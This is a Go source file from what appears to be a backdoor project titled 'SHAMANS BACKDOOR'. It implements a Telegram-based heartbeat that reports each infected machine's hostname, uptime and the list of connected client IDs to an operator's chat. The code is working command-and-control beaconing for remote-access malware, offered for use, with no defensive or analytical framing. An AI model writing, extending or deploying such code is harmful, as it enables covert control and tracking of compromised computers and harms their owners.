package api

import (
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/whiterabb17/shaman/package/cloud"
	"github.com/whiterabb17/shaman/package/util"
)

var (
	//StopHeartbeat signals the associated goroutine to stop when it is closed.
	StopHeartbeat chan struct{}
	Genesis       int
)

type beatConfig struct {
	header string
	time   time.Time
	uptime time.Duration
	footer string
}

func (b *beatConfig) Format() string {
	return fmt.Sprintf("%s\n```\nTime:   %s\nUptime: %s\n```\n%s",
		b.header,
		strings.Replace(b.time.Format(time.RFC3339), "T", " ", 1),
		fmt.Sprint(b.uptime),
		b.footer,
	)
}

func NewGenesis() {
	if StopHeartbeat != nil {
		close(StopHeartbeat)
	}
	m := tgbotapi.NewMessage(util.ChatID, util.GenesisText)
	m.ParseMode = "MarkdownV2"
	msg, _ := LBot.Send(m)
	Genesis = msg.MessageID
	util.ID, _ = os.Hostname()
}

var Ticker *time.Ticker

func FlatLine(id int) {
	beat := tgbotapi.NewDeleteMessage(util.ChatID, Genesis)
	LBot.Request(beat)
}

func formatList(list []string) string {
	var bots string
	for _, s := range list {
		bots += "__" + s + "__\n"
	}
	return bots
}

// Heartbeat is the function that provides status updates.
func Heartbeat() {
	log.Println("Heartbeat started")
	StopHeartbeat = make(chan struct{})
	Ticker = time.NewTicker(util.Interval * time.Second)
	//Create edit struct
	status := tgbotapi.NewEditMessageText(util.ChatID, Genesis, "")
	status.ParseMode = "MarkdownV2"
	beat := beatConfig{
		header: "\t\t		__SHAMANS BACKDOOR__ \t\t\n **Identifier " + util.ID + "**",
	}
	for {
		select {
		case <-Ticker.C:
			beat.time = time.Now()
			beat.uptime = time.Since(util.StartTime)
			beat.footer = formatList(cloud.ClientIdList)
			status.Text = beat.Format()
			LBot.Send(status)
		case <-StopHeartbeat:
			Ticker.Stop()
			log.Println("Heartbeat stopped")
			return
		}
	}
}
